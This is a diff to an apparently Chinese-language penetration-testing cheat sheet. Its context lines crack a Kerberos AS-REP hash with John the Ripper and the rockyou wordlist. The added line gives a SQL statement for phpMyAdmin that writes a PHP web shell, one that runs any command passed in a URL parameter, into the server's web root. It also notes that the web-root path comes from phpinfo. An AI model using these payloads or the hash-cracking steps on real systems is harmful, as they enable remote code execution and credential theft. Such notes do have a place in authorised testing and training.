@@ -365,6 +365,8 @@ john 1.txt # 获取加密方法
 # Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])从这一行看出是“krb5asrep”
 john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt 1.txt
 ```
+
+20. `SELECT "<?php echo system($_GET['cmd']); ?>" into OUTFILE 'C:/wamp/www/shell.php' `写入phpmyadmin建立档案，后面的地址查看phpinfo
 # 5. **提权**
 
 ```bash
